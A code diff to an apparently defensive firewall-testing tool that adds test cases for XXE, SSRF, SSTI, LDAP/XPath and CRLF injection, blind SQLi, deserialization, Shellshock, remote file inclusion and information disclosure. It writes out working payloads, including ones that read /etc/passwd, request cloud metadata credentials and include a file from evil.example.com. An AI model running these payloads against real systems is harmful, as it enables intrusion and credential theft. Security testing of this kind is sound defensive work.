@@ -100,6 +100,19 @@ EXPECTED_BEHAVIOR = {
     'pdf_js': 'Firewall Anti-Virus or File Blocking profile should detect and block PDF files containing embedded JavaScript, commonly used for exploitation',
     'office_macro': 'Firewall Anti-Virus or File Blocking should detect OLE2 documents with VBA macros (AutoOpen), a primary malware delivery vector',
     'pe_download': 'Firewall File Blocking or Anti-Virus profile should detect PE executable (MZ/PE header) downloads over HTTP and block based on file type policy',
+    # Advanced Web Attacks
+    'xxe': 'Firewall Vulnerability Protection should detect XML External Entity (XXE) patterns including DOCTYPE and ENTITY declarations targeting file:// or other URI schemes',
+    'ssrf': 'Firewall should detect Server-Side Request Forgery (SSRF) attempts targeting internal IPs, cloud metadata endpoints (169.254.169.254), or private network ranges',
+    'ssti': 'Firewall should detect Server-Side Template Injection patterns ({{...}}, ${...}) that attempt to execute code through template engines like Jinja2 or Freemarker',
+    'ldap_injection': 'Firewall should detect LDAP injection metacharacters and filter manipulation patterns that attempt to bypass LDAP-based authentication or query data',
+    'xpath_injection': 'Firewall should detect XPath injection patterns that attempt to manipulate XML queries for authentication bypass or data extraction',
+    'crlf_injection': 'Firewall should detect CRLF injection (%0d%0a) in HTTP headers that attempt to inject arbitrary headers or split HTTP responses for cache poisoning',
+    'open_redirect': 'Firewall should detect open redirect patterns where user-supplied URLs redirect to external malicious domains, commonly used in phishing attacks',
+    'blind_sqli': 'Firewall Vulnerability Protection should detect time-based blind SQL injection patterns like WAITFOR DELAY, SLEEP(), and BENCHMARK() used for data exfiltration',
+    'deserialization': 'Firewall should detect serialized object payloads (Java rO0AB, .NET AAEAAAD, PHP a:) that could lead to remote code execution via insecure deserialization',
+    'shellshock': 'Firewall Vulnerability Protection should detect Shellshock (CVE-2014-6271) pattern "() { :;}" in HTTP headers targeting Bash CGI handlers',
+    'file_inclusion': 'Firewall should detect Remote File Inclusion (RFI) patterns with URL parameters pointing to external files (http://, ftp://) for remote code execution',
+    'info_disclosure': 'Firewall should detect access attempts to common information disclosure paths (phpinfo.php, .env, .git/) that expose sensitive server configuration',
 }
 
 # ─── Test Catalog ───────────────────────────────────────────
@@ -137,6 +150,42 @@ WEB_ATTACK_TESTS = [
         'block', 'Vulnerability Protection'),
     SecurityTestCase('log4shell', 'Log4Shell — JNDI Lookup',
         'web_attacks', 'Log4j RCE via JNDI lookup string in HTTP header (CVE-2021-44228). Sends the ${jndi:ldap://...} payload in HTTP headers, exploiting the Log4j vulnerability to trigger remote code execution.',
+        'block', 'Vulnerability Protection'),
+    SecurityTestCase('xxe', 'XXE — XML External Entity',
+        'web_attacks', 'XML External Entity injection. Sends a crafted XML payload with a DOCTYPE declaration referencing an external entity (/etc/passwd), attempting server-side file disclosure.',
+        'block', 'Vulnerability Protection'),
+    SecurityTestCase('ssrf', 'SSRF — Server-Side Request Forgery',
+        'web_attacks', 'Sends a request with a URL parameter pointing to an internal metadata endpoint (169.254.169.254), attempting to access cloud instance metadata or internal services.',
+        'block', 'Vulnerability Protection'),
+    SecurityTestCase('ssti', 'SSTI — Server-Side Template Injection',
+        'web_attacks', 'Sends template expression payloads ({{7*7}}, ${7*7}) that execute on the server if improperly sandboxed. Tests detection of Jinja2/Twig/Freemarker injection patterns.',
+        'block', 'Vulnerability Protection'),
+    SecurityTestCase('ldap_injection', 'LDAP Injection',
+        'web_attacks', 'Injects LDAP filter metacharacters to modify directory queries. Sends payload with wildcard and boolean operators to extract or bypass LDAP authentication.',
+        'block', 'Vulnerability Protection'),
+    SecurityTestCase('xpath_injection', 'XPath Injection',
+        'web_attacks', 'Injects XPath query syntax to manipulate XML data queries. Sends boolean-based XPath injection to bypass authentication or extract XML document data.',
+        'block', 'Vulnerability Protection'),
+    SecurityTestCase('crlf_injection', 'CRLF / Header Injection',
+        'web_attacks', 'Injects carriage return and line feed characters (%0d%0a) into HTTP headers to add arbitrary headers or split the response, enabling cache poisoning or XSS.',
+        'block', 'Vulnerability Protection'),
+    SecurityTestCase('open_redirect', 'Open Redirect',
+        'web_attacks', 'Sends a request with a redirect parameter pointing to an external malicious site. Firewalls should detect URL redirect manipulation patterns.',
+        'block', 'Vulnerability Protection'),
+    SecurityTestCase('blind_sqli', 'Blind SQL Injection — Time-Based',
+        'web_attacks', 'Sends a time-based blind SQL injection payload using WAITFOR DELAY or SLEEP() to detect SQL injection vulnerabilities without direct output.',
+        'block', 'Vulnerability Protection'),
+    SecurityTestCase('deserialization', 'Insecure Deserialization',
+        'web_attacks', 'Sends a serialized Java object payload (rO0AB...) in the request body, targeting insecure deserialization vulnerabilities in Java-based applications.',
+        'block', 'Vulnerability Protection'),
+    SecurityTestCase('shellshock', 'Shellshock — CVE-2014-6271',
+        'web_attacks', 'Sends the Shellshock (Bash bug) exploit payload in HTTP headers. The () { :;} pattern exploits CVE-2014-6271 to achieve remote code execution on vulnerable CGI servers.',
+        'block', 'Vulnerability Protection'),
+    SecurityTestCase('file_inclusion', 'Remote File Inclusion (RFI)',
+        'web_attacks', 'Sends a URL parameter referencing a remote PHP file for inclusion. If the server processes this, it could execute arbitrary remote code.',
+        'block', 'Vulnerability Protection'),
+    SecurityTestCase('info_disclosure', 'Information Disclosure — phpinfo',
+        'web_attacks', 'Attempts to access common information disclosure paths (phpinfo.php, .env, .git/config) that expose sensitive server configuration and credentials.',
         'block', 'Vulnerability Protection'),
 ]
 
@@ -263,6 +312,19 @@ ATTACK_PAYLOADS = {
     'pdf_js': '/test-file/pdf-js',
     'office_macro': '/test-file/office-macro',
     'pe_download': '/test-file/pe',
+    # Advanced Web Attacks
+    'xxe': '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
+    'ssrf': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+    'ssti': '{{7*7}}${7*7}<%= 7*7 %>${{constructor.constructor("return this")()}}',
+    'ldap_injection': '*)(&(objectClass=*))(uid=*))(|(uid=*',
+    'xpath_injection': "' or '1'='1' or ''='",
+    'crlf_injection': '%0d%0aSet-Cookie:%20malicious=true%0d%0aX-Injected:%20header',
+    'open_redirect': 'https://evil.example.com/phishing',
+    'blind_sqli': "' AND SLEEP(5)-- -",
+    'deserialization': 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXQACGNhbGMuZXhl',
+    'shellshock': '() { :;}; /bin/cat /etc/passwd',
+    'file_inclusion': 'http://evil.example.com/shell.txt%00',
+    'info_disclosure': 'phpinfo.php|.env|.git/config|wp-config.php.bak|server-status',
 }
 
 # ─── Custom Pattern Store ──────────────────────────────────
@@ -637,6 +699,104 @@ class SecurityTestEngine:
             except (requests.ConnectionError, requests.Timeout) as e:
                 return self._blocked_result(test, str(e),
                     url=url, method=method, sent_payload=payload)
+
+        elif test.id == 'shellshock':
+            method = 'GET'
+            try:
+                resp = requests.get(url, params={'payload': 'test'},
+                    headers={'User-Agent': payload, 'Referer': payload},
+                    timeout=10)
+                return self._analyze_response(test, resp, payload,
+                    url=url, method=method, sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout) as e:
+                return self._blocked_result(test, str(e),
+                    url=url, method=method, sent_payload=payload)
+
+        elif test.id == 'xxe':
+            method = 'POST'
+            try:
+                resp = requests.post(url, data=payload,
+                    headers={'Content-Type': 'application/xml'}, timeout=10)
+                return self._analyze_response(test, resp, 'xxe',
+                    url=url, method=method, sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout) as e:
+                return self._blocked_result(test, str(e),
+                    url=url, method=method, sent_payload=payload)
+
+        elif test.id == 'deserialization':
+            method = 'POST'
+            try:
+                resp = requests.post(url, data=payload,
+                    headers={'Content-Type': 'application/x-java-serialized-object'}, timeout=10)
+                return self._analyze_response(test, resp, 'rO0AB',
+                    url=url, method=method, sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout) as e:
+                return self._blocked_result(test, str(e),
+                    url=url, method=method, sent_payload=payload)
+
+        elif test.id == 'crlf_injection':
+            method = 'GET'
+            crlf_url = f'http://{host}:{port}/echo?param=value{payload}'
+            try:
+                resp = requests.get(crlf_url, timeout=10)
+                return self._analyze_response(test, resp, 'malicious',
+                    url=crlf_url, method=method, sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout) as e:
+                return self._blocked_result(test, str(e),
+                    url=crlf_url, method=method, sent_payload=payload)
+
+        elif test.id == 'ssrf':
+            method = 'GET'
+            try:
+                resp = requests.get(url, params={'url': payload, 'payload': payload}, timeout=10)
+                return self._analyze_response(test, resp, '169.254',
+                    url=url, method=method, sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout) as e:
+                return self._blocked_result(test, str(e),
+                    url=url, method=method, sent_payload=payload)
+
+        elif test.id == 'open_redirect':
+            method = 'GET'
+            try:
+                resp = requests.get(url,
+                    params={'redirect': payload, 'url': payload, 'next': payload},
+                    timeout=10, allow_redirects=False)
+                return self._analyze_response(test, resp, 'evil.example.com',
+                    url=url, method=method, sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout) as e:
+                return self._blocked_result(test, str(e),
+                    url=url, method=method, sent_payload=payload)
+
+        elif test.id == 'info_disclosure':
+            # Try multiple common info disclosure paths
+            paths = payload.split('|')
+            method = 'GET'
+            for p in paths:
+                info_url = f'http://{host}:{port}/{p.strip()}'
+                try:
+                    resp = requests.get(info_url, timeout=5)
+                    if resp.status_code == 200:
+                        return self._passthrough_result(test, resp.status_code,
+                            f'Info disclosure path /{p.strip()} accessible — not blocked',
+                            resp=resp, url=info_url, method=method, sent_payload=payload)
+                except (requests.ConnectionError, requests.Timeout) as e:
+                    return self._blocked_result(test, str(e),
+                        url=info_url, method=method, sent_payload=payload)
+            return self._blocked_result(test,
+                'All info disclosure paths blocked or unavailable',
+                url=f'http://{host}:{port}/[multiple paths]', method=method, sent_payload=payload)
+
+        elif test.id == 'file_inclusion':
+            method = 'GET'
+            try:
+                resp = requests.get(url, params={'page': payload, 'file': payload},
+                    timeout=10)
+                return self._analyze_response(test, resp, 'evil.example.com',
+                    url=url, method=method, sent_payload=payload)
+            except (requests.ConnectionError, requests.Timeout) as e:
+                return self._blocked_result(test, str(e),
+                    url=url, method=method, sent_payload=payload)
+
         elif test.id == 'path_traversal':
             trav_url = f'http://{host}:{port}/{payload}'
             method = 'GET'
@@ -647,7 +807,9 @@ class SecurityTestEngine:
             except (requests.ConnectionError, requests.Timeout) as e:
                 return self._blocked_result(test, str(e),
                     url=trav_url, method=method, sent_payload=payload)
+
         else:
+            # Default: send payload as GET parameter (sqli, xss, cmdi, ssti, ldap, xpath, blind_sqli)
             method = 'GET'
             try:
                 resp = requests.get(url, params={'payload': payload}, timeout=10)
